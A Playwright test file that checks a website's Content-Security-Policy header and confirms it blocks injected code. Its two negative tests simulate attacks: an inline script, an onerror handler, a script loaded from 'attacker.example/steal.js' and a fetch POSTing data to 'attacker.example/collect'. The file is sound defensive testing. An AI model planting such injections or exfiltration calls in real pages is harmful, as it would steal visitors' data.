import type { Page } from '@playwright/test';
import { CONTENT_SECURITY_POLICY } from '../../../frontend/security-headers';
import { expect, test } from '../support/fixtures';
import { pages } from '../support/pages';
import { given, then, when } from '../support/steps';
import { expect3D } from '../support/webgl';

// The local preview sends the same Content-Security-Policy as CloudFront (frontend/security-headers.ts),
// so these check the real policy: every page works within it, and it stops injected code.

/** Records every Content-Security-Policy violation the page reports. */
async function recordViolations(page: Page) {
  await page.addInitScript(() => {
    const w = window as unknown as { __violations: string[] };
    w.__violations = [];
    document.addEventListener('securitypolicyviolation', (event) =>
      w.__violations.push(`${event.violatedDirective} blocked ${event.blockedURI || 'inline'}`),
    );
  });
}
const violations = (page: Page) => page.evaluate(() => (window as unknown as { __violations: string[] }).__violations);

test.describe('content security policy', { tag: '@security' }, () => {
  test('every page is served with the policy', async ({ request }) => {
    for (const { path } of pages) {
      const response = await when(`${path} is requested`, () => request.get(path));
      await then(`${path} carries the Content-Security-Policy and Permissions-Policy`, () => {
        expect(response.headers()['content-security-policy']).toBe(CONTENT_SECURITY_POLICY);
        expect(response.headers()['permissions-policy']).toContain('camera=()');
      });
    }
  });

  test('every page, its 3D views, map and search work without breaking the policy', async ({ page }) => {
    await given('policy violations are being recorded', () => recordViolations(page));
    for (const { path } of pages) {
      await when(`the visitor opens ${path}`, async () => {
        await page.goto(path);
        await page.waitForLoadState('networkidle');
        if (path === '/metrics' || path === '/analytics') await expect3D(page, page.getByTestId(path === '/metrics' ? 'test-grid-3d' : 'visitor-globe'));
      });
      await then(`${path} broke no rule`, async () => expect(await violations(page)).toEqual([]));
    }
    await when('they search the site', async () => {
      await page.getByRole('combobox', { name: 'Search the site' }).fill('appium');
      await expect(page.getByRole('listbox', { name: 'Search results' })).toBeVisible();
    });
    await then('search broke no rule either', async () => expect(await violations(page)).toEqual([]));
  });

  test('stops script injected into the page from running', { tag: '@negative' }, async ({ page }) => {
    await given('the visitor is on the home page, with violations recorded', async () => {
      await recordViolations(page);
      await page.goto('/home');
    });
    await when('an attacker manages to add an inline script, an event handler and a script from another site', () =>
      page.evaluate(() => {
        const w = window as unknown as { __pwned?: number };
        w.__pwned = 0;
        const inline = document.createElement('script');
        inline.textContent = 'window.__pwned = (window.__pwned || 0) + 1';
        document.body.append(inline);
        const img = document.createElement('img');
        img.setAttribute('src', 'x');
        img.setAttribute('onerror', 'window.__pwned = (window.__pwned || 0) + 1');
        document.body.append(img);
        const remote = document.createElement('script');
        remote.src = 'https://attacker.example/steal.js';
        document.body.append(remote);
      }),
    );
    await then('none of it runs, and the browser reports each attempt', async () => {
      await expect.poll(() => violations(page)).toEqual(
        expect.arrayContaining([expect.stringMatching(/^script-src/), expect.stringContaining('attacker.example')]),
      );
      expect(await page.evaluate(() => (window as unknown as { __pwned: number }).__pwned)).toBe(0);
    });
  });

  test('stops the page sending data to another site', { tag: '@negative' }, async ({ page }) => {
    await given('the visitor is on the home page, with violations recorded', async () => {
      await recordViolations(page);
      await page.goto('/home');
    });
    const outcome = await when('a script tries to send data to an outside server', () =>
      page.evaluate(() => fetch('https://attacker.example/collect', { method: 'POST', body: 'secret' }).then(() => 'sent', () => 'blocked')),
    );
    await then('the request is blocked by the policy', async () => {
      expect(outcome).toBe('blocked');
      await expect.poll(() => violations(page)).toEqual(expect.arrayContaining([expect.stringMatching(/^connect-src blocked https:\/\/attacker\.example/)]));
    });
  });
});
